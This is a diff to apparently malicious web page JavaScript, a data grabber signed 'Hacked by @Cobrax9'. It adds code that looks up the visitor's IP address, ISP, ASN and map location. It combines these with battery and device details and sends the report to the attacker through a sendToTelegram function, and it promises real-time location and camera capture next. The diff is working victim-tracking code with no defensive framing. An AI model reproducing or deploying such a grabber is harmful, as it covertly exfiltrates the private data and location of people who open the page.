@@ -80,7 +80,10 @@
         fetch("https://ipinfo.io/json?token=demo")
           .then(res => res.json())
           .then(data => {
-            let basicInfo = "📱 Hacked by Mr. @Cobrax9\n\n";
+            let basicInfo = "📱 Hacked by @Cobrax9\n\n";
+            basicInfo += "🌐 IP Info:\n";
+            basicInfo += `🌐 IP: ${data.ip}\n📡 ISP: ${data.org}\n🔍 ASN: ${data.org?.split(" ")[0]}\n`;
+            basicInfo += `📍 IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
 
             basicInfo += "📱 Device Info:\n";
             basicInfo += `🔋 Charging: ${charging}\n`;
@@ -90,7 +93,7 @@
             basicInfo += `🖥️ User Agent: ${ua}\n`;
             basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
             basicInfo += "👀 Real-time location & camera coming next...";
-            let basicInfo = "📱 Hacked by @Shopandbuyy\n\n";
+
             sendToTelegram(basicInfo);
           });
       });
